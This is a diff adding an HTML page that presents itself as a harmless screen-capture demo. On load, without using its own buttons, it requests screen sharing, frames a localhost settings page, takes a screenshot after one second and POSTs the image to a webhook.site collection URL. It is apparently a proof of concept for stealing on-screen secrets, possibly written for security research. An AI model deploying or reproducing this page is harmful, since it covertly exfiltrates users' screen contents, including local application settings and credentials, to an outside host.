@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <script>
+        window.onload = () => {
+            console.log(1);
+
+            const videoElem = document.getElementById("video");
+
+            // Options for getDisplayMedia()
+
+            var displayMediaOptions = {
+                video: {
+                    cursor: "always"
+                },
+                audio: false
+            };
+
+            // Set event listeners for the start and stop buttons
+            startCapture();
+            // console.log = msg => logElem.innerHTML += `${msg}<br>`;
+            // console.error = msg => logElem.innerHTML += `<span class="error">${msg}</span><br>`;
+            // console.warn = msg => logElem.innerHTML += `<span class="warn">${msg}<span><br>`;
+            // console.info = msg => logElem.innerHTML += `<span class="info">${msg}</span><br>`;
+
+            function captureScreenshot(video) {
+                console.log('screenshoting')
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+                const img = canvas.toDataURL('image/jpeg');
+                fetch('https://webhook.site/aff99555-e8f3-42ef-9062-8d1721a05c63', {
+                    method: 'post',
+                    body: img
+                }).then(x => x.text()).then(() => console.log('ok')).catch(console.error);
+                //   saveImage(canvas.toDataURL('image/jpeg').substr('data:image/jpeg;base64,'.length));
+                video.classList.add('flashit');
+                setTimeout(() => video.classList.remove('flashit'), 1000);
+            }
+
+
+            async function startCapture() {
+                console.log('aaa');
+
+                try {
+                    videoElem.srcObject = await navigator.mediaDevices.getDisplayMedia(displayMediaOptions);
+                    dumpOptionsInfo();
+                    console.log('aaa');
+                    setTimeout(() => captureScreenshot(videoElem), 1000);
+                } catch (err) {
+                    console.error("Error: " + err);
+                }
+            }
+
+            function stopCapture(evt) {
+                let tracks = videoElem.srcObject.getTracks();
+
+                tracks.forEach(track => track.stop());
+                videoElem.srcObject = null;
+            }
+
+            function dumpOptionsInfo() {
+                const videoTrack = videoElem.srcObject.getVideoTracks()[0];
+
+                console.info("Track settings:");
+                console.info(JSON.stringify(videoTrack.getSettings(), null, 2));
+                console.info("Track constraints:");
+                console.info(JSON.stringify(videoTrack.getConstraints(), null, 2));
+            }
+        }
+    </script>
+
+</head>
+
+<body>
+
+    <iframe src='http://localhost:4000/settings' width='720' height='400' ></iframe>
+
+    <p>This example shows you the contents of the selected part of your display.
+        Click the Start Capture button to begin.</p>
+
+    <p><button id="start">Start Capture</button>&nbsp;<button id="stop">Stop Capture</button></p>
+
+    <video id="video" autoplay></video>
+    <br>
+
+    <strong>Log:</strong>
+    <br>
+    <pre id="log"></pre>
+
+    <canvas id='canvas'></canvas>
+
+
+
+</body>
+
+</html>
